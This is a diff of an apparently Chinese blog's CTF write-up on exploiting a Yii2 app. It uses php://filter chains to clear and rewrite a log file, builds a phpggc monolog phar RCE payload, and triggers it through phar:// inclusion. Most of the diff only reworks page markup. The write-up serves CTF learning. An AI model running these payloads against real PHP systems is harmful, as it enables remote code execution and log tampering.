-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#f1fa8c">&#34;=&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(i))[<span style="color:#bd93f9">2</span>:] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;=00&#34;</span> <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> res])<span style="color:#ff79c6">.</span>upper())
-</span></span><span style="display:flex;"><span><span style="color:#6272a4">#=65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00</span>
-</span></span></code></pre></div><h4 id="tips">tips</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s1">&#39;xxxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s2">&#34;=&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="o">+</span> <span class="s2">&#34;=00&#34;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">res</span><span class="p">])</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#=65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00</span>
+</span></span></code></pre></div><h3 id="tips">tips</h3>
 <p>下面关于写入payload的两个问题，如果我们直接写入生成的字符</p>
-<p><img src="https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png" alt="image-20210528113356324"></p>
-<p><img src="https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png" alt="image-20210528114302006"></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png"
+    data-srcset="https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png, https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png 1.5x, https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png 2x"
+    data-sizes="auto"
+    alt="image-20210528113356324"
+    title="image-20210528113356324"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png"
+    data-srcset="https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png, https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png 1.5x, https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png 2x"
+    data-sizes="auto"
+    alt="image-20210528114302006"
+    title="image-20210528114302006"/></p>
 <p><code>utf-16le.utf-8</code>报错了，前面说过这个过滤器对于字符转换是两个字符进行识别，所以我们需要在写入payload的后面加上一个任意字符，让payload结果为双数。</p>
 <p>写入<code>payload</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>?file==65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00x
-</span></span></code></pre></div><p>清除其他字符</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
-</span></span></code></pre></div><p>成功写入</p>
-<p><img src="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">?file==65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00x
+</span></span></span></code></pre></div><p>清除其他字符</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
+</span></span></span></code></pre></div><p>成功写入</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png"
+    data-srcset="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png, https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png 1.5x, https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png 2x"
+    data-sizes="auto"
+    alt="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png"
+    title="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png"/></p>
 <p>下面就是写入任意<code>payload</code>，用<code>phpggc</code>找一个符合<code>monolog</code>版本的RCE链，生成</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>php -d<span style="color:#f1fa8c">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0|python -c <span style="color:#f1fa8c">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4">#如果要执行带有空格的命令，需要用引号包含一下，类似system &#39;ls /&#39;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">php -d<span class="s1">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output <span class="p">|</span> base64 -w0<span class="p">|</span>python -c <span class="s2">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#如果要执行带有空格的命令，需要用引号包含一下，类似system &#39;ls /&#39;</span>
 </span></span></code></pre></div><p>用上面脚本生成一下然后写入，本地写入payload后进行干扰字符清除的时候，因为长度问题可能会导致转换出错，转化错误就添加一个字符保证为双数即可。</p>
 <p>重复上面写入任意字符操作，最后用phar进行文件包含</p>
 <pre tabindex="0"><code class="language-url" data-lang="url">?file=phar://../runtime/logs/app.log/test.txt
-</code></pre><p><img src="https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png" alt="image-20210528135430505"></p>
-<h3 id="后续-5-28">后续 5-28</h3>
+</code></pre><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png"
+    data-srcset="https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png, https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png 1.5x, https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png 2x"
+    data-sizes="auto"
+    alt="image-20210528135430505"
+    title="image-20210528135430505"/></p>
+<h2 id="后续-5-28">后续 5-28</h2>
 <p>由于前面有提到 <code>convert.iconv.utf-16le.utf-8</code> 过滤器是通过每两个字符进行转换，🤔了一下，如果把日志内容经过base64加密一次转成双数的字符，然后再用 <code>utf-16le</code> 来转换成非base64字符，最后再base64解密一次，应该也可以达到清除日志的目的。</p>
 <pre tabindex="0"><code class="language-url" data-lang="url">?file=php://filter/write=convert.base64-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
 </code></pre><p>结合之前的方式就有三种清除日志的方法，对于写日志<code>strips.tags</code>应该也可以进行利用( Dog3的师傅告诉我的。</p>
-<p>最后是对于命令执行，由于触发函数是<code>call_user_func</code>，在php7版本后，<code>assert</code>不能用来进行代码执行了，导致写shell的想法落空，最后也没成功。</p>
-
-        </p>
+<p>最后是对于命令执行，由于触发函数是<code>call_user_func</code>，在php7版本后，<code>assert</code>不能用来进行代码执行了，导致写shell的想法落空，最后也没成功。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2021-05-25&#32;21:20:21>更新于 2021-05-25&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/posts/ciscn-web-filter/" data-title="CISCN_web_filter" data-hashtags="yii2,RCE"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/posts/ciscn-web-filter/" data-hashtag="yii2"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/posts/ciscn-web-filter/" data-title="CISCN_web_filter" data-image="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
     </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/yii2/' class="post-tag">yii2</a><a href='/tags/rce/' class="post-tag">RCE</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav">
+      <a href="/posts/frp/" class="post-nav-item" rel="next" title="frp浅改记录">frp浅改记录<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
-
-<aside class="post-toc">
-    <nav id="toc">
-        <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li>
-          <ul>
-            <li><a href="#本地环境搭建">本地环境搭建</a></li>
-            <li><a href="#利用">利用</a>
-              <ul>
-                <li><a href="#tips">tips</a></li>
-              </ul>
-            </li>
-            <li><a href="#后续-5-28">后续 5-28</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-    </nav>
-</aside>
-
-
-
-    
-
-        </main><footer class="footer">
-    <span>&copy; 2022 le3&#39;s blog</span>
-    <span>
-        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
-    </span>
-</footer>
-</body>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.104.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright order-2" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中 ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">网站运行中 ...</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="right: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"typeit-header-subtitle-desktop":"web security | code review","typeit-header-subtitle-mobile":"web security | code review"},"enablePWA":true,"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50},"siteTime":"2022-12-21T16:00:00+08:00","twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-subtitle-desktop":["typeit-header-subtitle-desktop"],"typeit-header-subtitle-mobile":["typeit-header-subtitle-mobile"]},"duration":-1,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
